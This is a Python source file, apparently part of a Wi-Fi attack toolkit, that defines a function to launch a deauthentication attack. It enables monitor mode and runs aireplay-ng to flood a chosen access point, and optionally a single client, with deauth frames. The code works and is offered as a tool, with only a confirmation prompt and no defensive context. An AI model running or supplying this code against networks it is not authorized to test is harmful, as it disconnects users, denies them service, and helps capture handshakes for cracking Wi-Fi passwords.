#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import subprocess
import time
from utils.hardware import interface, hardware_available, adapter_detected
from utils.interface import enable_monitor_mode
from utils.status import print_status, ProgressDisplay, confirm_action
from utils.process import active_processes, add_process, remove_process, is_cancelled, set_cancel_flag


def deauth_attack(bssid: str, count: int = 10, client: str = None) -> bool:
    """Send deauthentication frames."""
    if not hardware_available or not adapter_detected:
        print_status("No USB adapter detected", "error")
        return False

    if not confirm_action(f"Send {count} deauth frames to {bssid}?", default=False):
        print_status("Deauth cancelled", "info")
        return False

    set_cancel_flag(False)
    print_status(f"Deauth attack: {bssid} (count={count})", "info")

    mon_iface = enable_monitor_mode(interface)
    if not mon_iface:
        print_status("Monitor mode failed", "error")
        return False

    cmd = ["aireplay-ng", "-0", str(count), "-a", bssid]
    if client:
        cmd.extend(["-c", client])
        print_status(f"Targeting client: {client}", "info")
    cmd.append(mon_iface)

    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    add_process(proc)

    progress = ProgressDisplay()
    progress.start("Sending deauth frames", count)

    for i in range(count + 2):
        if is_cancelled():
            progress.stop()
            print_status("Deauth cancelled", "warning")
            proc.terminate()
            remove_process(proc)
            return False
        time.sleep(1)
        progress.update(min(i, count))

    progress.stop()
    proc.terminate()
    remove_process(proc)
    print_status("Deauth frames sent", "success")
    return True
